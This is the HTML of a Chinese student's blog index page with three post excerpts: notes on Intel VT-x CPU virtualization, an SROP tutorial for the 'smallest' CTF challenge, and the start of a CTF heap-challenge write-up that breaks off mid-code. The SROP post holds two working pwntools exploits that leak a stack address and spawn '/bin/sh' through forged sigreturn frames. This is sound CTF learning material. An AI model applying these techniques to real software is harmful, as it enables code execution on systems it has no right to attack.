<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>唐仔橙</title><meta name="author" content="唐仔橙,tangzicheng233@gmail.com"><meta name="copyright" content="唐仔橙"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:type" content="website">
<meta property="og:title" content="唐仔橙">
<meta property="og:url" content="https://tangzichengcc.github.io/page/3/index.html">
<meta property="og:site_name" content="唐仔橙">
<meta property="og:description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tangzichengcc.github.io/img/profile.png">
<meta property="article:author" content="唐仔橙">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tangzichengcc.github.io/img/profile.png"><link rel="shortcut icon" href="/img/favicon.webp"><link rel="canonical" href="https://tangzichengcc.github.io/page/3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MTZmw-Jp9gUmwt4q-TLzEzI1_TFDA2QpQLuyUeOqzk4"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":500,"languages":{"author":"作者: 唐仔橙","link":"链接: ","source":"来源: 唐仔橙","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '唐仔橙',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2023-12-11 17:36:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">80</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/index_img.gif')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">唐仔橙</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">唐仔橙</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%85%A5%E9%97%A8-1-CPU%E8%99%9A%E6%8B%9F%E5%8C%96/" title="虚拟化入门-1-CPU虚拟化">虚拟化入门-1-CPU虚拟化</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-03T12:43:32.000Z" title="发表于 2023-08-03 20:43:32">2023-08-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-28T15:38:55.711Z" title="更新于 2023-09-28 23:38:55">2023-09-28</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E8%99%9A%E6%8B%9F%E5%8C%96/">虚拟化</a></span></div><div class="content">​		研究组的方向是虚拟化…研一一直在学pwn(都还没入门..惭愧). 刚回所里,有师兄带一下,学一下虚拟化, 接触了一点感觉还不错,挺有意思的, 主要是 操作系统层面的东西. 或许后面可以作为主要方向来做.
​		下面的内容都是来自《系统虚拟化：原理与实现》,作为虚拟化的概念入门还是不错的感觉
​		主要是了解了虚拟化基础的概念之后,学习intel的 VT虚拟化技术
第三章 虚拟化概述虚拟机的三个典型特征：同质、高效、资源受控。
​		大多数计算机体系结构都有两个及以上的特权级，用来分隔系统软件和应用软件。系统中有一些操作和管理关键系统资源的指令被定位特权指令，只有在最高特权级上能够正确执行。如果在非最高特权级上运行，特权指令会引发一个异常，处理器会陷入最高特权级，交由系统软件来处理。
​		在虚拟化世界中，有一类指令成为敏感指令，简而言之是操作特权资源的指令。所有的特权指令都是敏感指令，但不是所有的敏感指令都是特权指令。
​		判断一个结构是否可以虚拟化，核心在于对敏感指令的支持，如果在某些结构上所有敏感指令都是特权指令，则它是可虚拟化的结构，否则，如果它无法支持在所有的敏感指令上触发异常，则不是一个可虚拟化的机构，称其存在“虚拟化漏洞”
​		通过陷入再模拟指令的执行来实现虚拟机的方法是前提条件的：所有的敏感指令都必须是特权指令。如果不满足的话就会有遗漏，此时需要想办法来填补或者避免这些遗漏。
3.2 处理器虚拟化​		处理器虚拟化是VMM中最核心的部分，因为访问内存或者I&#x2F;O的指令本身就是敏感指令，所以内存虚拟化与I&#x2F;O虚拟化都依赖于处理器虚拟化的正确实现。
指令的模拟​		因为特权级的存在，敏感指令需要陷入到VMM中通过软件的方式进行模拟。
​		三个概念：虚拟寄存器、上下文和虚拟处理器
​		当客户机操作系统试图访问关键资源的时候，该请求并不会真正发生在物理寄存器上。相反，VMM会通过准确模拟物理处理器的行为，而将其访问定位到VMM为其设计与物理寄存器对应的“虚拟”的寄存器上。（对VMM来说，这样的虚拟寄存器往往是在内存中。）
​		一个案例，不论是对CR0的修改还是访问，都会经过处理器抛出异常，由VMM操作对应的虚拟CR0。

​		在没有虚拟化的环境中，os直接负责物理处理器管理，负责进程间的调度和切换。在VMM接管物理处理器后，客户机操作系统没有管理物理处理器的权利，可以说此时它已经运行在VMM为之设计的虚拟处理器之上，客户机管理虚拟处理器，并在虚拟处理器上负责该虚拟机内进程间调度和切换。
​		而VMM管理物理处理器，负责虚拟处理器的调度和切换，以保证在给定时间内，每个虚拟处理器上的当前进程可以在物理处理器上运行一段时间。但是，不管是何种调度，必然要涉及到保留现场，这个现场就是上下文状态。
​		相比进程等上下文，虚拟处理器上下文会更加复杂，因为客户机操作系统本身包含许多敏感指令，会试图访问和修改物理处理器上定义的所有寄存器，但这种访问会和修改会被VMM重定位到虚拟处理器上。所以，对于虚拟处理器，其上下文包括了更多的系统寄存器.当VMM在决定切换虚拟处理器的时候，为了让虚拟机看起来好像从未被中断过一样，VMM需要考虑保存和回复的上下文也更加复杂。
​		从VMM的角度来说，虚拟处理器是其需要模拟完成的一组功能集合，虚拟处理器的功能可以由物理处理器和VMM共同完成。对于非敏感指令，物理处理器直接解码处理其请求，并将相关的效果直接反应到物理寄存器上，而对于敏感指令，VMM负责陷入再模拟，从程序角度来说就是一组数据结构和相关处理代码的集合。数据结构用于存储虚拟寄存器的内容，而相关处理代码负责按照物理处理器的行为将效果反映到虚拟寄存器上。
​		上面的概念可以说明，在处理器虚拟化中，不论是定义虚拟寄存器和虚拟处理器还是利用上下文进行虚拟处理器调度切换，其宗旨都是让虚拟机里执行的敏感指令陷入下来以后，能被VMM模拟，而不要直接作用于真实硬件上。
​		模拟的前提是陷入，需要了解怎么进行陷入，需要陷入的时候，是怎么通知VMM的。概括地说，VMM陷入是利用了处理器的保护机制，利用中断和异常来完成，有以下几种方式：

1.基于处理器保护机制触发的异常，例如敏感指令的执行。
2.虚拟机主动触发异常，即通常所说的陷阱
异步中断，包括处理器内部的中断源和外部的设备中断源

VMM的功能和组成​		VMM的主要功能事基于物理资源创建相应的虚拟资源，组成虚拟机，为客户机操作系统提供虚拟的平台。所以，可以推测，VMM基本上可以分为两部分：虚拟环境的管理和物理资源的管理。
虚拟环境的管理物理资源的管理其他模块VMM分类按虚拟平台分类完全虚拟化​		虚拟出来的平台和现实平台是一样的，客户机操作系统不用做任何修改就可以运行。重点是VMM要能够正确处理所有可能的指令。
​		在实现方式上，以x86为例，经历了两个阶段：软件辅助的完全虚拟化和硬件辅助的完全虚拟化
软件辅助的完全虚拟化​		早期因为一开始肯定没想要要弄这个，所以硬件上也不会专门适配，所以完全虚拟化需要通过软件来实现。一个典型的做法是优先级压缩和二进制代码翻译相结合。
​		优先级压缩来处理的话，有部分指令不能触发异常，因此不能截获做处理。而二进制代码翻译就是为了解决这部分指令，它的思想是，通过扫描并修改客户机的二进制代码，将这些指令转换成支持虚拟化的指令。
​		虽然这种方式能够实现完全虚拟化，但是这种类似于打补丁的方式很难在架构上保证其完整性，于是后期，x86厂商就在硬件上加入了对虚拟化的支持。
硬件辅助的完全虚拟化​		很符合计算机的抽象层次的逻辑，当这一层事情比较难解决的时候，就给它再抽象出一层来。Intel的VT-x技术是这一方向的代表，它在处理器上引入了一个新的执行模式用于运行虚拟机。当虚拟机运行在这个特殊模式中时，任何特权操作都会被处理器拦截并报告给VMM。
​		
类虚拟化​		在源代码级别（操作系统内核的代码）修改指令以回避虚拟化漏洞的方式来使VMM能够对物理资源实现虚拟化。
按VMM实现结构分类Hypervisor模型、宿主模型、混合模型
第五章 硬件辅助虚拟化​		硬件辅助虚拟化，即在CPU、芯片组及I&#x2F;O设备等硬件中加入专门针对虚拟化的支持，使得系统软件可以更加容易、高效地实现虚拟化功能。本章以intel VT为例。
​		intel vt分别在CPU、内存、IO虚拟化方面提供了不同的技术，分别对应VT-x、EPT、VT-d。

CPU虚拟化的硬件支持​		引入了两种操作模式，统称为VMX模式，每种模式都有0~3的特权级。

根操作模式（VMX Root Operation）：VMM运行所处的模式
非根操作模式（VMX Non-Root Operation）：客户机运行所处的模式


​		非根模式下所有敏感指令的行为都会被重新定义，使得他们能不经过虚拟化就能直接运行或者通过“陷入再模拟”的方式来处理，在根模式下，所有指令的行为和传统IA32一样，因此所有软件都能够正常运行。
​		非根模式下敏感指令引起的“陷入”被称为VM-Exit。这会导致CPU自动从非根模式切换到根模式。相应的，VM-Entry，该操作由VMM发起，通常是调度某个客户机运行，此时CPU从根模式切换到非根模式。
​		为了更好地支持CPU虚拟化，VT-x引入了VMCS（virtual-Machine Control Structure 。虚拟机控制结构），VMCS保存虚拟CPU需要的相关状态，例如CPU在两种模式下的特权寄存器的值。VMCS主要供CPU使用，CPU在发生VM-Exit和VM-Entry时都会自动查询和更新VMCS。VMM可以通过指令来配置VMCS，进而影响CPU的行为。
​		VT-x还引入了一组新的指令，包括VMLAUCH&#x2F;VMRESUME用于发起VM-Entry，VMREAD&#x2F;VMWRITE用于配置VMCS等
这里有点没看懂。。。

VMCS​		与虚拟寄存器的概念类似，可以看作是虚拟寄存器概念在硬件上的应用。VMCS是保存在内存中的数据结构，包含了虚拟CPU的相关寄存器的内容和虚拟CPU相关的控制信息，每个VMCS对应一个虚拟CPU。（换句话说，个人理解的是，物理CPU和虚拟CPU之间的一个媒介，用于保存和恢复切换时的上下文
​		VMCS在使用时需要和物理CPU绑定。VMCS与物理CPU是一对一绑定的关系。但在不同时刻可以绑定到不同的物理CPU。这种绑定关系的变化称为VMCS的迁移。
​		VT-x提供了两条指令用于VMCS的绑定与解除绑定

VMPRTLD&lt;VMCS地址&gt;： 将指定的VMCS与执行该指令的物理CPU绑定

VMCLEAR：将执行该指令的物理CPU与它的VMCS解除绑定。该指令会将物理CPU缓存中的VMCS结构同步到内存中去，从而保证VMCS与新的物理CPU绑定时，内存中的值是最新的。


​		VMCS格式如下：

​		主要信息放在数据域里面，VT-x提供两条指令用于访问VMCS

VMREAD&lt;索引&gt;： 读VMCS中索引指定的域

VMWRITE&lt;索引&gt;&lt;数据&gt;：写VMCS中索引指定的域
VMCS数据域包括六大类信息
客户机状态域
宿主机状态域
VM-Entry控制域
VM-Execution控制域
VM-Exit控制域
VM-Exit信息域


VMX操作模式
VM-Entry​		在发起之前，VMM会设置好VMCS相关域的内容，例如客户机状态域、宿主机状态域等，然后执行VM-Entry指令。
​		VT-x为VM-Entry提供了两条指令

VMLAUNCH: 用于刚执行过VMCLEAER的VMCS的第一次VM-Entry

VMRESUME：用于执行过VMLAUNCH的VMCS的后续VM-Entry
在VM-Entry进入时，会有很多不同的特性和选择，或者说具体行为，由VM-Entry控制域来规定



​		注入的事件最终是用客户机自己的IDT里面指定的处理函数来处理的，这样在客户机虚拟CPU看来，这些事件就和没有虚拟化的环境里面对应的事件没有任何区别
VM-Entry的过程
执行基本的检查来确保VM-Entry能开始
对VMCS中的宿主机状态域的有效性进行检查，以确保下一次VM-Exit时可以正确地从客户机环境切换到VMM环境
检查VMCS中客户机状态域的有效性，根据客户机状态域来装载处理器的状态
根据VMCS中VM-Entry MSR-load区域装载MSR寄存器
根据VMCS中VM-Entry事件注入控制的配置，可能需要注入事件到客户机

​		如果1-4步的检查没有全部通过，CPU会报告VM-Entry失败，这通常意味着VMCS中某些字段的设置有错误。如果全部通过了，处理器就会把执行环境从VMM切换到客户机环境，开始执行客户机指令。
VM-Exit​		指CPU从非根模式切换到根模式，客户机切换到VMM的操作。因为的原因有很多，例如在非根模式下执行了敏感指令、发生了中断等。处理VM-Exit事件是VMM模拟指令、虚拟特权资源的一大任务。
具体过程
CPU首先将此次VM-Exit的原因信息记录到VMCS相应的信息域中，VM-Entry interruption-information字段的有效位（bit31）被清零。
CPU状态被保存到VMCS客户机状态域。根据设置也可能将客户机的MSR保存到VM-Exit MSR-store区域
根据VMCS中宿主机状态域和VM-Exit控制域中的设计，将宿主机状态加载到CPU相应寄存器。CPU也可能根据VM-Exit MSR-store区域来加载VMM的MSR。

CPU虚拟化的实现硬件虚拟化用VCPU描述符来描述虚拟CPU，类似os中的进程描述符，其本质是一个结构体，
结构如下：
​		当VMM创建客户机时，首先要为客户机创建VCPU，整个客户机的运行实际上可以看作是VMM调度不同的VCPU运行。

VMCS的创建与初始化
VCPU的运行上下文切换​		VCPU的上下文分为两部分，所以切换也分为由硬件自动切换（VMCS部分）和VMM软件切换（非VMCS部分）

​		具体切换步骤：
1.VMM保存自己的上下文，主要是保存VMCS不保存的寄存器，即宿主机状态域以外的部分
2.VMM将保存在VCPU中的由软件切换的上下文加载到物理CPU中
3.VMM执行VMRESUME&#x2F;VMLAUNCH指令，触发VM-Entry，此时CPU自动将VCPU上下文中VMCS部分加载到物理CPU，CPU切换到非根模式。
​		惰性保存&#x2F;恢复： 这个方法是对上下文切换进行的优化，因为上下文切换带来的开销比较大。它的思想是

VCPU的硬件优化​		优化的目的是尽可能少地在客户机和VMM之间切换，从而减少上下文切换的开销。Intel VT-x提供两种优化方法。
VCPU的退出​		推出的原因可能是执行了特权指令、发生了物理中断等，在VT-x中表现为发生VM-Exit。对VCPU退出的处理是VMM进行CPU虚拟化的核心，例如模拟各种特权指令。

​		退出的原因大体上有三类：
1.访问了特权资源，对CR和MSR寄存器的访问都属于这一类

2.客户机执行的指令引发了异常，例如缺页错误
3.发生了中断。
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-36-SROP/" title="pwn入门-36-SROP">pwn入门-36-SROP</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-29T13:01:21.000Z" title="发表于 2023-07-29 21:01:21">2023-07-29</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-29T13:07:20.679Z" title="更新于 2023-07-29 21:07:20">2023-07-29</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">基础看ctf-wiki和《权威指南pwn》
出自论文: Framing Signals — A Return to Portable Shellcode
理论基础32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)
攻击条件1.栈溢出,且大小足够
2.知道以下内容地址
“&#x2F;bin&#x2F;sh”、signal frame、syscall、sigreturn
对sigreturn, 只要rax&#x3D;15(64位下),执行syscall即可,rax可以通过一些方式来间接控制,比如作为read的返回值(读取的字节数)
例题  360 春秋杯  smallest-pwn
​		这个不能用正常程序的流程来看待,就这几行汇编, 首先向栈顶读取了0x400字符,然后ret, 又会从栈顶取值作为下一条指令.
​		程序中没有sigreturn系统调用,但是有read,通过read可以控制rax寄存器的值, 然后再调用syscall即可,换句话说,其实可以调用任意的系统调用(不考虑其他寄存器是否满足条件)
​		execve(“&#x2F;bin&#x2F;sh”,0,0) 最终的目标是要执行这个, 但现在最大的问题是, 不知道”&#x2F;bin&#x2F;sh”的地址,所以需要想办法泄露栈地址,然后输入到这个确定的地址上面.
攻击步骤1.泄露地址​		因为ret后从rsp取值,所以rsp这里要放几个程序的起始地址start_addr,然后首先要利用write输出栈的地址,可以看到这两句指令
123mov rsi,rspmov rdi,raxsyscall

​		如果利用之前的read把rax控制为1,那么就可以调用write的系统调用了,而rsi正好是rsp,所以可以输出一个rsp中的一个栈指针,理论上也是指向栈的某个位置.
​		要执行write的话,需要跳过xor这条指令,所以是不是应该在rsp上放一个0x400b3,也就是xor下一条指令的地址呢? 理论上需要,其实也不用,因为在输入一个字符的时候,可以输入\xb3, 这样把rsp上原先存放的start_addr地址的最后一个字节改了,也可以实现这个效果

123456payload = p64(start_addr) * 3sh.send(payload)sh.send(&#x27;\xb3&#x27;)stack_addr = u64(sh.recv()[8:16])log.success(&#x27;leak stack addr :&#x27; + hex(stack_addr))

​		在输出的时候可以看到第二个地址才是栈上地址,所以取值[8:16], 为啥rsp上面要放3三个初始地址呢?
​		第一个用来读入 \xb3,  第二个时 进入了write,泄露地址, 第三个该继续走下面流程了

​		
2.构造frame: 实现读入已知地址的功能​		刚开始非常纳闷…这段汇编给的就是read的汇编,为啥要用frame构造啊….后来想明白后,还是自己太想当然了,前面给的read的汇编是不知道rsp的地址的,通过构造的frame,在恢复的时候,可以指定rsp的值,这样才能知道&#x2F;bin&#x2F;sh的地址(或许可以暴力破解?
12345678910111213sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + &#x27;a&#x27; * 8 + str(sigframe)sh.send(payload)## set rax=15 and call sigreturnsigreturn = p64(syscall_ret) + &#x27;b&#x27; * 7sh.send(sigreturn)

​		7个b不会影响吗??? 会覆盖sigframe的开头,但是不知道覆盖的哪个寄存器????,不过看结果是没影响的
3. 读如execve的frame,然后执行1234567891011sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &#x27;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + b&quot;b&quot;*8 + bytes(sigframe)payload = frame_payload + (0x120-len(frame_payload))*b&#x27;\x00&#x27;+b&#x27;/bin/sh\x00&#x27;sh.send(payload)sh.send(sigreturn)

​		与2原理一样,读入frame,然后执行
exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *small = ELF(&#x27;./smallest&#x27;)if args[&#x27;REMOTE&#x27;]:    sh = remote(&#x27;127.0.0.1&#x27;, 7777)else:    sh = process(&#x27;./smallest&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(sh)context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;syscall_ret = 0x00000000004000BEstart_addr = 0x00000000004000B0payload = p64(start_addr) * 3sh.send(payload)pause()sh.send(&quot;\xb3&quot;)stack_addr = u64(sh.recv()[8:16])log.success(&#x27;leak stack addr :&#x27; + hex(stack_addr))sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_retpayload = p64(start_addr) + b&#x27;a&#x27;*8 + bytes(sigframe)sh.send(payload)sigreturn = p64(syscall_ret) + b&quot;b&quot;*7pause()sh.send(sigreturn)sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x120  # &quot;/bin/sh&quot; &#x27;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retpause()frame_payload = p64(start_addr) + b&quot;b&quot;*8 + bytes(sigframe)payload = frame_payload + (0x120-len(frame_payload))*b&#x27;\x00&#x27;+b&#x27;/bin/sh\x00&#x27;sh.send(payload)pause()sh.send(sigreturn)sh.interactive()



暴力破解解法​		不过这个解法也是基于在本地能大概看一下偏移差多少的情况下，如果直接暴力破解的话，难度应该会更大一点

12345678910111213141516171819202122232425262728293031323334from pwn import *small = ELF(&#x27;./smallest&#x27;)sh = process(&#x27;./smallest&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#gdb.attach(sh)context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;syscall_ret = 0x00000000004000BEstart_addr = 0x00000000004000B0payload = p64(start_addr) * 3sh.send(payload)#pause()sh.send(b&quot;\xb3&quot;)stack_addr = u64(sh.recv()[8:16])log.success(&#x27;leak stack addr :&#x27; + hex(stack_addr))sigreturn = p64(syscall_ret) + b&quot;b&quot;*7sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr  -0xa1f  # &quot;/bin/sh&quot; &#x27;s addrsigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_retframe_payload = p64(start_addr) + b&quot;c&quot;*8 + bytes(sigframe)payload = frame_payload + b&#x27;/bin/sh\x00&#x27;*90#pause()sh.send(payload)sh.send(sigreturn)sh.interactive()





其他gdb中如何查看 sigframe结构?
gdb查看结构体信息
https://wizardforcel.gitbooks.io/100-gdb-tips/content/set-print-pretty-on.html
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-35-7%E6%9C%88%E6%9C%88%E8%B5%9Bpwn/" title="pwn入门-35-7月月赛pwn">pwn入门-35-7月月赛pwn</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-07-28T10:43:04.000Z" title="发表于 2023-07-28 18:43:04">2023-07-28</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-29T13:02:57.880Z" title="更新于 2023-07-29 21:02:57">2023-07-29</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PWN%E5%85%A5%E9%97%A8/">PWN入门</a></span></div><div class="content">题目链接: 本链接+&#x2F;pwn
​		一上来能看到是一个很明显的菜单堆题,并且有后门函数,很明显要劫持控制流,执行后门函数,但问题是没找到通用的漏洞,但是能看到add中,有很大一串逻辑,后来也看到了这里有关于后门函数的操作,以及存放puts函数的地址. 
​		确定思路大概是想办法操作堆块位置,布置好位置,把后门函数放到puts函数的位置,然后调用就可以了.
​		不过后面看这逻辑看迷糊了….其实挺简单的逻辑, 注意两点,一点是可以辅助画图,来帮助自己分析,另外一点是通过调试来帮助自己分析, 只用脑子想…脑子可能不太够用..
12345678910111213141516171819202122232425262728293031323334353637383940414243unsigned __int64 add()&#123;....  puts(&quot;size:&quot;);  size = 0;  __isoc99_scanf(&quot;%u&quot;, &amp;size);  if ( size &lt;= 0x200 &amp;&amp; size &gt; 7 )  &#123;    for ( size_4 = 0; size_4 &lt;= 1; ++size_4 )    &#123;      if ( !*((_QWORD *)&amp;ptrs + 2 * size_4) )      &#123;        dword_4068[4 * size_4] = size;        *((_QWORD *)&amp;ptrs + 2 * size_4) = malloc(size);        if ( !*((_QWORD *)&amp;ptrs + 2 * size_4) )        &#123;          puts(&quot;malloc error&quot;);          exit(0);        &#125;        **((_QWORD **)&amp;ptrs + 2 * size_4) = &amp;puts;        puts(&quot;content:&quot;);        v7 = read(0, (void *)(*((_QWORD *)&amp;ptrs + 2 * size_4) + 8LL), size - 8);        if ( v7 &gt; 0 )          *(_BYTE *)(v7 + 7LL + *((_QWORD *)&amp;ptrs + 2 * size_4)) = 0;        v1 = *(_WORD *)(v7 + 14LL + *((_QWORD *)&amp;ptrs + 2 * size_4));        v8 = magicffff;        if ( v1 == 8995 )          v8 = *(unsigned __int64 (**)())(v7 + 8LL + 